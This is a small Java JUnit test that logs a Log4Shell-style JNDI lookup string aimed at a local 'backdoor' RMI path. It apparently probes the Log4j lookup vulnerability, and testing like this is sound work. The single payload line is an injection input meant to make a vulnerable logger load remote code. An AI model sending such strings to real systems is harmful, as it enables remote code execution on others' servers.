package com.lizza.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;

public class Log4JTests {

    public static final Logger log = LogManager.getLogger(Log4JTests.class);

    @Test
    public void test1() throws Exception {
        log.info("${jndi:rmi//localhost:8080/backdoor/hello}");
        log.info("hello");
    }
}
